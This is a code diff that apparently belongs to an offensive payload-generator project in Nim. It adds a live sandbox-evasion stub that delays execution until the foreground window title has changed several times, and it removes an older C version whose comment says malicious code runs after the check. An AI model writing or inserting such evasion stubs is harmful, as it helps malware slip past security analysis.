@@ -153,43 +153,43 @@ when isMainModule:
         quit()
 
 """
-#[
 
-    ToDo: 
-The idea is that the application is waiting for the foreground window title to change x amount of time before continuing execution.
+let WindowChangeStub * = """
 
-Aka if a human is interacting with the system it will eventually run the code. You can have a big delay is you set the MIN_COUNT to a big number like 1000. I personally use between 10 and 20.
+# Credit: Idea from @Mr-Un1k0d3r
 
-        
-#include <windows.h>
-#include <stdio.h>
+from winim/inc/windef import LPWSTR
+from winim/inc/windef import WCHAR
+from winim/inc/windef import HWND
+from winim/inc/winuser import GetForegroundWindow
+from winim/inc/winuser import GetWindowTextW
+from winim/winstr import winstrConverterWStringToLPWSTR
+from winim/winstr import newWString
+from winim/winstr import `$`
 
-#define MIN_COUNT 10
+var MIN_COUNT = 15
+var counter = 0
+var current*: WCHAR
 
-CHAR current[256];
+proc evade *(): void =
+  while counter <= MIN_COUNT:
+    var title: LPWSTR = newWString(256)
+    var hwnd: HWND = GetForegroundWindow()
+    if hWnd != 0:
+        GetWindowTextW(hWnd, title, 256)
+    if (title[] != current):
+      when defined(verbose):
+        echo "Title changed to: ", $title
+      current = title[]
+      inc counter
+      when defined(verbose):
+        echo "Increased counter to: ", counter
 
-int main() {
-        DWORD passed = 0;
-        memset(current, 0x00, 256);
 
-        while(passed < MIN_COUNT) {
-                HWND hwnd = GetForegroundWindow();
-                CHAR *title = (CHAR*)GlobalAlloc(GPTR, 256);
-                GetWindowTextA(hwnd, title, 256);
-                if(strcmp(title, current) == 0) {
-                        strncpy(current, title, 256);
-                        passed++;
-                }
-                GlobalFree(title);
-        }
+when isMainModule:
+    evade()
 
-        // You passed the user interaction check at this point code execute malicious code
-
-        return 0;
-}
-
-]#
-
+"""
 
 let DomainJoinStub * = """
 # This will check for ANY domain join
